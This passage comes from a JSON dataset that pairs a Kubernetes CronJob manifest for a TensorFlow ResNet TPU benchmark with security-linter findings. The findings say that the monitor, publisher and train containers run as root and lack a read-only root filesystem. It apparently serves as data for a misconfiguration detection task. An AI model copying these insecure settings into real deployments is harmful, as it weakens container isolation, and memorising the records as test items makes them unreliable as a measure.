    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v2-32\n    benchmarkId: tf-nightly-classifier-resnet-func-v2-32\n    frameworkVersion: tf-nightly\n    mode: func\n    model: classifier-resnet\n  name: tf-nightly-classifier-resnet-func-v2-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/image_classification/classifier_trainer.py\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_type=resnet\n          - --dataset=imagenet\n          - --mode=train_and_eval\n          - --model_dir=$(MODEL_DIR)\n          - \"--params_override=\\\"evaluation\\\":\\n  \\\"epochs_between_evals\\\": 1\\n\\\"\\\n            train\\\":\\n  \\\"epochs\\\": 1\\n\\\"train_dataset\\\":\\n  \\\"builder\\\": \\\"records\\\"\\\n            \\n\\\"validation_dataset\\\":\\n  \\\"builder\\\": \\\"records\\\"\\n\"\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --config_file=official/vision/image_classification/configs/examples/resnet/imagenet/tpu.yaml\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/classifier-resnet/func/v2-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v2: 32\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/classifier-resnet/func/v2-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-classifier-resnet-func-v2-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"monitor\" does not have a read-only root file system"
  },
  {
    "id": "6748",
    "manifest_path": "data/manifests/the_stack_sample/sample_2449.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v2-32\n    benchmarkId: tf-nightly-classifier-resnet-func-v2-32\n    frameworkVersion: tf-nightly\n    mode: func\n    model: classifier-resnet\n  name: tf-nightly-classifier-resnet-func-v2-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/image_classification/classifier_trainer.py\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_type=resnet\n          - --dataset=imagenet\n          - --mode=train_and_eval\n          - --model_dir=$(MODEL_DIR)\n          - \"--params_override=\\\"evaluation\\\":\\n  \\\"epochs_between_evals\\\": 1\\n\\\"\\\n            train\\\":\\n  \\\"epochs\\\": 1\\n\\\"train_dataset\\\":\\n  \\\"builder\\\": \\\"records\\\"\\\n            \\n\\\"validation_dataset\\\":\\n  \\\"builder\\\": \\\"records\\\"\\n\"\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --config_file=official/vision/image_classification/configs/examples/resnet/imagenet/tpu.yaml\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/classifier-resnet/func/v2-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v2: 32\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/classifier-resnet/func/v2-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-classifier-resnet-func-v2-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"publisher\" does not have a read-only root file system"
  },
  {
    "id": "6749",
    "manifest_path": "data/manifests/the_stack_sample/sample_2449.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v2-32\n    benchmarkId: tf-nightly-classifier-resnet-func-v2-32\n    frameworkVersion: tf-nightly\n    mode: func\n    model: classifier-resnet\n  name: tf-nightly-classifier-resnet-func-v2-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/image_classification/classifier_trainer.py\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_type=resnet\n          - --dataset=imagenet\n          - --mode=train_and_eval\n          - --model_dir=$(MODEL_DIR)\n          - \"--params_override=\\\"evaluation\\\":\\n  \\\"epochs_between_evals\\\": 1\\n\\\"\\\n            train\\\":\\n  \\\"epochs\\\": 1\\n\\\"train_dataset\\\":\\n  \\\"builder\\\": \\\"records\\\"\\\n            \\n\\\"validation_dataset\\\":\\n  \\\"builder\\\": \\\"records\\\"\\n\"\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --config_file=official/vision/image_classification/configs/examples/resnet/imagenet/tpu.yaml\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/classifier-resnet/func/v2-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v2: 32\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/classifier-resnet/func/v2-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-classifier-resnet-func-v2-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"train\" does not have a read-only root file system"
  },
  {
    "id": "6750",
    "manifest_path": "data/manifests/the_stack_sample/sample_2449.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v2-32\n    benchmarkId: tf-nightly-classifier-resnet-func-v2-32\n    frameworkVersion: tf-nightly\n    mode: func\n    model: classifier-resnet\n  name: tf-nightly-classifier-resnet-func-v2-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/image_classification/classifier_trainer.py\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_type=resnet\n          - --dataset=imagenet\n          - --mode=train_and_eval\n          - --model_dir=$(MODEL_DIR)\n          - \"--params_override=\\\"evaluation\\\":\\n  \\\"epochs_between_evals\\\": 1\\n\\\"\\\n            train\\\":\\n  \\\"epochs\\\": 1\\n\\\"train_dataset\\\":\\n  \\\"builder\\\": \\\"records\\\"\\\n            \\n\\\"validation_dataset\\\":\\n  \\\"builder\\\": \\\"records\\\"\\n\"\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --config_file=official/vision/image_classification/configs/examples/resnet/imagenet/tpu.yaml\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/classifier-resnet/func/v2-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v2: 32\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/classifier-resnet/func/v2-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-classifier-resnet-func-v2-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"monitor\" is not set to runAsNonRoot"
  },
  {
    "id": "6751",
    "manifest_path": "data/manifests/the_stack_sample/sample_2449.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v2-32\n    benchmarkId: tf-nightly-classifier-resnet-func-v2-32\n    frameworkVersion: tf-nightly\n    mode: func\n    model: classifier-resnet\n  name: tf-nightly-classifier-resnet-func-v2-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/image_classification/classifier_trainer.py\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_type=resnet\n          - --dataset=imagenet\n          - --mode=train_and_eval\n          - --model_dir=$(MODEL_DIR)\n          - \"--params_override=\\\"evaluation\\\":\\n  \\\"epochs_between_evals\\\": 1\\n\\\"\\\n            train\\\":\\n  \\\"epochs\\\": 1\\n\\\"train_dataset\\\":\\n  \\\"builder\\\": \\\"records\\\"\\\n            \\n\\\"validation_dataset\\\":\\n  \\\"builder\\\": \\\"records\\\"\\n\"\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --config_file=official/vision/image_classification/configs/examples/resnet/imagenet/tpu.yaml\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/classifier-resnet/func/v2-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v2: 32\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/classifier-resnet/func/v2-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-classifier-resnet-func-v2-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"publisher\" is not set to runAsNonRoot"
  },
  {
    "id": "6752",
    "manifest_path": "data/manifests/the_stack_sample/sample_2449.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v2-32\n    benchmarkId: tf-nightly-classifier-resnet-func-v2-32\n    frameworkVersion: tf-nightly\n    mode: func\n    model: classifier-resnet\n  name: tf-nightly-classifier-resnet-func-v2-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/image_classification/classifier_trainer.py\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_type=resnet\n          - --dataset=imagenet\n          - --mode=train_and_eval\n          - --model_dir=$(MODEL_DIR)\n          - \"--params_override=\\\"evaluation\\\":\\n  \\\"epochs_between_evals\\\": 1\\n\\\"\\\n            train\\\":\\n  \\\"epochs\\\": 1\\n\\\"train_dataset\\\":\\n  \\\"builder\\\": \\\"records\\\"\\\n            \\n\\\"validation_dataset\\\":\\n  \\\"builder\\\": \\\"records\\\"\\n\"\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --config_file=official/vision/image_classification/configs/examples/resnet/imagenet/tpu.yaml\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/classifier-resnet/func/v2-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v2: 32\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/classifier-resnet/func/v2-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-classifier-resnet-func-v2-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"train\" is not set to runAsNonRoot"
  },
  {
    "id": "6753",
    "manifest_path": "data/manifests/the_stack_sample/sample_2449.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v2-32\n    benchmarkId: tf-nightly-classifier-resnet-func-v2-32\n    frameworkVersion: tf-nightly\n    mode: func\n    model: classifier-resnet\n  name: tf-nightly-classifier-resnet-func-v2-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/image_classification/classifier_trainer.py\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_type=resnet\n          - --dataset=imagenet\n          - --mode=train_and_eval\n          - --model_dir=$(MODEL_DIR)\n          - \"--params_override=\\\"evaluation\\\":\\n  \\\"epochs_between_evals\\\": 1\\n\\\"\\\n            train\\\":\\n  \\\"epochs\\\": 1\\n\\\"train_dataset\\\":\\n  \\\"builder\\\": \\\"records\\\"\\\n            \\n\\\"validation_dataset\\\":\\n  \\\"builder\\\": \\\"records\\\"\\n\"\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --config_file=official/vision/image_classification/configs/examples/resnet/imagenet/tpu.yaml\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/classifier-resnet/func/v2-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v2: 32\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: 